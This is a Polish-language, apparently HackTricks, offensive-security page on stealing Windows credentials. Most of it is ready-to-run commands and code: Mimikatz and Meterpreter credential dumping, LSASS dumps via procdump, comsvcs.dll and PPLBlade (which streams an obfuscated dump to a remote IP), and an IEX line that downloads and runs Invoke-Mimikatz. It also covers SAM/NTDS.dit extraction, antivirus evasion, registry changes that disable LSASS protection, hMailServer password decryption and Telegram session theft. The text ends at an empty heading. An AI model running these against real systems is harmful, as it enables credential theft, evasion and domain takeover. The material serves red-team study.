# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Dowiedz się, co jeszcze potrafi Mimikatz, na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Dowiedz się tutaj o niektórych możliwych zabezpieczeniach poświadczeń.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatzowi wyodrębnienie niektórych poświadczeń.**

## Poświadczenia w Meterpreterze

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **który** stworzyłem, aby **wyszukiwać hasła i hashe** na maszynie ofiary.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Omijanie AV

### Procdump + Mimikatz

**Ponieważ Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem firmy Microsoft**, Defender go nie wykrywa.\
Możesz użyć tego narzędzia, aby **zrzucić proces lsass**, **pobrać zrzut** i **lokalnie wyodrębnić** z niego **dane uwierzytelniające**.

Możesz też użyć [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ten proces jest wykonywany automatycznie przez [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzucania lsass.exe**, ponieważ **wykrywają** ciągi znaków **„procdump.exe” i „lsass.exe”**. Dlatego bardziej **stealthy** jest przekazanie jako **argumentu** **PID** procesu lsass.exe do procdump **zamiast** nazwy lsass.exe.

### Zrzucanie lsass za pomocą **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll**, znajdująca się w `C:\Windows\System32`, odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Zawiera **funkcję** o nazwie **`MiniDumpW`**, którą można wywołać za pomocą `rundll32.exe`.\
Pierwsze dwa argumenty nie mają znaczenia, ale trzeci jest podzielony na trzy składniki. Pierwszym jest identyfikator procesu, którego pamięć ma zostać zrzucona, drugim — lokalizacja pliku zrzutu, a trzecim — wyłącznie słowo **full**. Nie ma innych dostępnych opcji.\
Po przetworzeniu tych trzech składników biblioteka DLL tworzy plik zrzutu i zapisuje w nim pamięć wskazanego procesu.\
Bibliotekę **comsvcs.dll** można wykorzystać do zrzucenia procesu lsass, eliminując tym samym konieczność przesyłania i uruchamiania procdump. Metoda ta została szczegółowo opisana na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Do wykonania służy następujące polecenie:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy pasek zadań i kliknij Menedżer zadań
2. Kliknij Więcej szczegółów
3. Na karcie Procesy znajdź proces „Local Security Authority Process”
4. Kliknij proces „Local Security Authority Process” prawym przyciskiem myszy i kliknij „Utwórz plik zrzutu”.

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to binarny plik podpisany przez Microsoft, będący częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Istniejący zrzut awarii całego systemu lub jego skompresowana kopia w dostępnym folderze użytkownika mogą zachowywać dane uwierzytelniające do analizy offline. Nazwy plików, takie jak `MEMORY.DMP` i `MEMORY.7z`, są jedynie wskazówkami do dalszej analizy: zweryfikuj ich pochodzenie i dostępność, nie zakładaj zaś, że zawierają użyteczne lub aktualne dane uwierzytelniające.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpowanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzucania chronionych procesów, które obsługuje zaciemnianie memory dump i przesyłanie go na zdalne stacje robocze bez zapisywania go na dysku.

**Najważniejsze funkcje**:

1. Omijanie ochrony PPL
2. Zaciemnianie plików memory dump, aby uniknąć mechanizmów Defendera wykrywających sygnatury
3. Przesyłanie memory dump za pomocą metod RAW i SMB bez zapisywania go na dysku (zrzut bezplikowy)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – zrzucanie LSASS oparte na SSP bez MiniDumpWriteDump

Ink Dragon używa trzyetapowego narzędzia do zrzucania pamięci o nazwie **LalsDumper**, które nigdy nie wywołuje `MiniDumpWriteDump`, więc hooki EDR na tym API nigdy się nie uruchamiają:<sup>[[3]](#references)</sup>

1. **Loader Stage 1 (`lals.exe`)** – wyszukuje w `fdp.dll` placeholder składający się z 32 małych liter `d`, zastępuje go bezwzględną ścieżką do `rtu.txt`, zapisuje zmodyfikowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. Wymusza to załadowanie przez **LSASS** złośliwej biblioteki DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 w LSASS** – gdy LSASS ładuje `nfdp.dll`, biblioteka DLL odczytuje `rtu.txt`, wykonuje XOR każdego bajtu z `0x20` i mapuje zdekodowany blob do pamięci, po czym przekazuje mu sterowanie.
3. **Dumper Stage 3** – zmapowany payload ponownie implementuje logikę MiniDump, używając **direct syscalls** rozwiązywanych na podstawie hashy nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje skompresowany zrzut LSASS do pliku i zamyka uchwyt, aby później można było przeprowadzić eksfiltrację.

Uwagi operatora:

* Umieść `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 zastępuje zahardkodowany placeholder bezwzględną ścieżką do `rtu.txt`, więc rozdzielenie tych plików przerywa łańcuch.
* Rejestracja odbywa się przez dodanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie dodać tę wartość, aby LSASS ponownie ładował SSP przy każdym uruchomieniu systemu.
* Pliki `%TEMP%\*.ddt` to skompresowane zrzuty. Rozpakuj je lokalnie, a następnie użyj Mimikatz/Volatility do ekstrakcji poświadczeń.
* Uruchomienie `lals.exe` wymaga uprawnień admin/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po powrocie z wywołania LSASS przejrzyście ładuje nieautoryzowany SSP i wykonuje Stage 2.
* Usunięcie biblioteki DLL z dysku nie usuwa jej z LSASS. Usuń wpis rejestru i zrestartuj LSASS (uruchom ponownie system) albo pozostaw go, aby zapewnić długotrwałą persystencję.

## CrackMapExec

### Zrzut hashy SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Zrzucanie sekretów LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Zrzut NTDS.dit z docelowego DC

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historię haseł NTDS.dit z docelowego DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Wykradanie SAM i SYSTEM

Te pliki powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Nie można ich jednak **po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiej wykraść te pliki, uzyskując ich kopię z rejestru:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** za pomocą:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Za pomocą tej usługi można kopiować chronione pliki. Wymagane są uprawnienia administratora.

#### Using vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ale możesz zrobić to samo z poziomu **Powershell**. Oto przykład **kopiowania pliku SAM** (używany dysk to „C:”, a plik zostanie zapisany w C:\users\Public), ale możesz użyć tej metody do skopiowania dowolnego chronionego pliku:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na koniec możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby skopiować SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Poświadczenia Active Directory — NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory** i zawiera kluczowe dane dotyczące obiektów użytkowników, grup oraz ich członkostwa. To w nim przechowywane są **hash’e haseł** użytkowników domeny. Plik ten jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się pod ścieżką **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych znajdują się trzy główne tabele:

- **Data Table**: tabela ta przechowuje informacje o obiektach, takich jak użytkownicy i grupy.
- **Link Table**: śledzi relacje, takie jak członkostwo w grupach.
- **SD Table**: przechowuje **deskryptory zabezpieczeń** każdego obiektu, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Badania Christoffera Anderssona nad warstwą bazy danych dokładniej opisują te tabele i ich zachowanie zależne od wersji.<sup>[[8]](#references)</sup>

System Windows używa pliku _Ntdsa.dll_ do obsługi tego pliku, a korzysta z niego _lsass.exe_. W rezultacie **część** pliku **NTDS.dit** może znajdować się **w pamięci procesu `lsass`** (prawdopodobnie można tam znaleźć ostatnio używane dane dzięki wykorzystaniu **cache**, co poprawia wydajność).

#### Odszyfrowywanie hashy w NTDS.dit

Hash jest szyfrowany trzykrotnie:

1. Odszyfruj klucz szyfrowania haseł (**PEK**) za pomocą **BOOTKEY** i **RC4**.
2. Odszyfruj **hash** za pomocą **PEK** i **RC4**.
3. Odszyfruj **hash** za pomocą **DES**.

**PEK** ma **taką samą wartość na każdym kontrolerze domeny**, ale jest **zaszyfrowany** w pliku **NTDS.dit** za pomocą specyficznego dla danego kontrolera domeny **BOOTKEY** z jego gałęzi **SYSTEM**. Dlatego do wyodrębnienia poświadczeń potrzebne są zarówno **NTDS.dit**, jak i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiowanie NTDS.dit za pomocą Ntdsutil

Dostępne od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Możesz też użyć sztuczki z [**kopią w tle woluminu**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że potrzebna będzie również kopia **pliku SYSTEM** (możesz ją [**zrzucić z rejestru lub użyć sztuczki z kopią w tle woluminu**](#stealing-sam-and-system)).

### **Wyodrębnianie hashy z NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Możesz je również **automatycznie wyodrębnić** przy użyciu prawidłowego użytkownika domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnianie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Możesz również użyć **modułu metasploit**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale również całe obiekty i ich atrybuty, co pozwala uzyskać dodatkowe informacje po pobraniu surowego pliku NTDS.dit.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Gałąź `SYSTEM` jest opcjonalna, ale umożliwia odszyfrowanie sekretów (hashy NT i LM, dodatkowych poświadczeń, takich jak hasła w postaci jawnej, klucze Kerberos lub zaufania, oraz historii haseł NT i LM). Oprócz innych informacji wyodrębniane są: konta użytkowników i maszyn wraz z ich hashami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwo rekurencyjne, drzewo jednostek organizacyjnych i ich członkostwo, zaufane domeny wraz z typem, kierunkiem i atrybutami zaufania...

## Lazagne

Pobierz plik binarny [stąd](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębniania poświadczeń z różnych programów.

```
lazagne.exe all
```

## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może służyć do wyodrębniania poświadczeń z pamięci. Pobierz je ze strony: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnij poświadczenia z pliku SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Wyodrębnianie poświadczeń z pliku SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom**, a hasła zostaną wyodrębnione.

## Wydobywanie danych z nieaktywnych sesji RDP i osłabianie zabezpieczeń

RAT FinalDraft od Ink Dragon zawiera tasker `DumpRDPHistory`, którego techniki przydadzą się każdemu red-teamerowi:<sup>[[3]](#references)</sup>

### Zbieranie danych telemetrycznych w stylu DumpRDPHistory

* **Docelowe serwery RDP połączeń wychodzących** – przeanalizuj każdy hive użytkownika w lokalizacji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` i znacznik czasu ostatniej modyfikacji. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ślady przychodzących połączeń RDP** – przeszukaj dziennik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem identyfikatorów zdarzeń **21** (pomyślne logowanie) i **25** (rozłączenie), aby ustalić, kto administrował tym hostem:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Gdy już ustalisz, który Domain Admin regularnie się łączy, zrzucaj LSASS (za pomocą LalsDumper/Mimikatz), póki jego **rozłączona** sesja nadal istnieje. Mechanizm awaryjny CredSSP + NTLM pozostawia w LSASS jego dane weryfikacyjne i tokeny, które można następnie odtworzyć przez SMB/WinRM, aby przejąć `NTDS.dit` lub utrwalić dostęp na kontrolerach domeny.

### Obniżanie ustawień rejestru przez FinalDraft

Ten sam implant modyfikuje też kilka kluczy rejestru, aby ułatwić kradzież poświadczeń:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivots w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM logować się, gdy DC jest online, dając atakującym dostęp do kolejnego wbudowanego konta z wysokimi uprawnieniami.
* `RunAsPPL=0` usuwa zabezpieczenia LSASS PPL, dzięki czemu narzędzia do zrzucania pamięci, takie jak LalsDumper, mogą łatwo uzyskać do niej dostęp.

## Poświadczenia z konfiguracji hMailServer (po przejęciu)

Sprawdź dokładne pliki konfiguracyjne `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, zależnie od układu instalacji. Odczytywalna, niepusta wartość `[Security] AdministratorPassword=` jest hashem hasła administratora hMailServer; nie świadczy o tym, że jest to hasło administratora Windows. Jeśli uda się odzyskać te poświadczenia, pivot do konta Windows wymaga niezależnego potwierdzenia ponownego użycia hasła oraz uprawnień do logowania.

W instalacjach korzystających z bazy danych SQL CE osobna wartość `[Database] Password=` w pliku INI zabezpiecza bazę danych. W starszych instalacjach ta wartość jest zaszyfrowana algorytmem Blowfish ze statycznym kluczem `THIS_KEY_IS_NOT_SECRET` i zamianą kolejności bajtów w 4-bajtowych słowach. Użyj ciągu szesnastkowego z pliku INI w poniższym fragmencie kodu Python:<sup>[[2]](#references)</sup>

Najpierw upewnij się, że bieżące konto może odczytać **zarówno** plik INI, jak i odpowiadającą mu bazę danych SQL CE `.sdf`. Hasło z pliku INI zabezpiecza bazę danych; jest oddzielne od hashy haseł kont skrzynek pocztowych zapisanych w jej wnętrzu. Sprawdzaj lub aktualizuj **kopię** używanej bazy danych, nigdy plik produkcyjny.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Używając hasła w postaci jawnego tekstu, skopiuj bazę danych SQL CE, aby uniknąć blokad plików, załaduj dostawcę 32-bitowego i w razie potrzeby zaktualizuj bazę przed odpytywaniem o hashe:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolumna `accountpassword` używa formatu hashy hMailServer (tryb `1421` w hashcat). Złamane hasło do skrzynki pocztowej staje się punktem przesiadkowym do konta Windows tylko wtedy, gdy hasło jest ponownie używane przez konto lokalne/domenowe, a to konto ma wymagane uprawnienia do logowania zdalnego.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Niektóre narzędzia przechwytują hasła logowania w **plaintext**, przechwytując callback logowania LSA `LsaApLogonUserEx2`. Pomysł polega na przechwyceniu lub opakowaniu callbacku pakietu uwierzytelniającego, aby przechwycić credentials **podczas logowania** (przed hashowaniem), a następnie zapisać je na dysku lub zwrócić operatorowi. Zwykle jest to realizowane jako helper, który wstrzykuje się do LSA lub rejestruje się w nim, a następnie zapisuje każde udane zdarzenie logowania interaktywnego/sieciowego wraz z nazwą użytkownika, domeną i hasłem.<sup>[[1]](#references)</sup>

Uwagi operacyjne:
- Do załadowania helpera w ścieżce uwierzytelniania wymagane są lokalne uprawnienia administratora/SYSTEM.
- Przechwycone credentials pojawiają się tylko wtedy, gdy nastąpi logowanie (interaktywne, RDP, usługi lub sieciowe — zależnie od hooka).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) przechowuje zapisane informacje o połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Dedykowane narzędzia do zrzucania danych mogą przeanalizować ten plik i odzyskać zapisane credentials SQL. W powłokach, które zwracają wyłącznie wyniki poleceń, plik jest często eksfiltrowany przez zakodowanie go jako Base64 i wypisanie na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Po stronie operatora odtwórz plik i uruchom lokalnie dumper, aby odzyskać poświadczenia:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Kradzież sesji Telegram Desktop `tdata`

Telegram Desktop przechowuje dane autoryzacji i stan konta w katalogu **`tdata`**. Skopiowaną sesję można załadować za pomocą kompatybilnych narzędzi, aby uwierzytelnić się bez hasła do konta, dopóki ta autoryzacja pozostaje ważna; jeśli włączono szyfrowanie danych lokalnych, złodziej potrzebuje również kodu dostępu. Uwierzytelniona sesja może następnie ujawnić dane identyfikacyjne, metadane dialogów i członkostwa, wiadomości oraz multimedia do pobrania.<sup>[[10]](#references)</sup>

### Wykrywanie i pozyskiwanie

Szukaj zarówno w lokalizacjach instalacji, jak i w wersjach przenośnych; nazwy pakietów Microsoft Store są różne, dlatego wylistuj katalogi pakietów zawierające `TelegramMessenge` i sprawdź ich podkatalog `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Jeśli zwykłe odczyty się nie powiodą, a token procesu **już zawiera i ma włączone** `SeBackupPrivilege`, dostęp uwzględniający kopie zapasowe stanowi rozwiązanie zastępcze; nie uzyskuje tego uprawnienia ani nie podnosi poziomu uprawnień procesu. `CreateFileW` z `FILE_FLAG_BACKUP_SEMANTICS` może zażądać semantyki kopii zapasowej/przywracania i ominąć kontrole zabezpieczeń plików, jeśli token zawiera wymagane uprawnienia, ale sama flaga nie omija niezgodnej blokady współdzielenia.<sup>[[10]](#references)[[11]](#references)</sup>

W przypadku używanych plików z blokadą utwórz/odczytaj **Volume Shadow Copy**; w przypadku plików zablokowanych przez ACL `robocopy /B` używa trybu kopii zapasowej i omija ACL plików oraz katalogów.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant uwzględniający ograniczoną przepustowość może najpierw przesłać wyłącznie spis ścieżek plików, otrzymać identyfikator migawki i listę ścieżek już przechowywanych przez C2, a następnie przesłać tylko brakujące pliki. Dlatego niewielkie transfery przyrostowe po rekursywnym wyliczeniu zawartości `tdata` nadal mogą oznaczać skuteczną kradzież sesji.<sup>[[10]](#references)</sup>

### Wykrywanie i powstrzymywanie

Skoreluj rekursywny dostęp do `tdata` ze strony procesu innego niż Telegram z włączeniem `SeBackupPrivilege`, otwieraniem plików z semantyką kopii zapasowej, aktywnością VSS lub uruchomieniem procesu potomnego `robocopy.exe` z opcją `/B`. Szukaj też szybkiego wyliczania zawartości zarówno `%APPDATA%`, jak i `%LOCALAPPDATA%\Packages`, po którym następują połączenia wychodzące z tego samego procesu. Po przejęciu użyj **Ustawienia → Urządzenia** (lub **Prywatność i bezpieczeństwo → Aktywne sesje**), aby zakończyć nieznane sesje; samo włączenie weryfikacji dwuetapowej nie unieważnia wcześniej skradzionej autoryzacji.<sup>[[10]](#references)[[13]](#references)</sup>

## Kradzież poświadczeń Passkeys / WebAuthn z Chrome w systemie Windows

Jeśli uda się uzyskać wykonanie kodu jako **użytkownik będący ofiarą** na hoście Windows korzystającym z **Chrome + zsynchronizowanych Passkeys w Google Password Manager**, Passkeys stają się interesującym celem post-exploitation, nawet **bez uprawnień administratora/SYSTEM**.<sup>[[4]](#references)</sup>

### Interesujące artefakty lokalne

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** przechowuje zakodowane w protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces działający w kontekście tego samego użytkownika może wyliczyć **RP ID**, **nazwę użytkownika**, **ID poświadczenia** oraz zaszyfrowany materiał klucza prywatnego zsynchronizowanych passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** przechowuje lokalny stan rejestracji urządzenia, taki jak **`wrapped_identity_private_key`** i opakowany sekret używany do odzyskiwania zsynchronizowanych poświadczeń.<sup>[[4]](#references)</sup>

Szybka analiza:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Obiekty blob klucza powiązane z TPM nadal mogą być nadużywane jako lokalna wyrocznia podpisująca

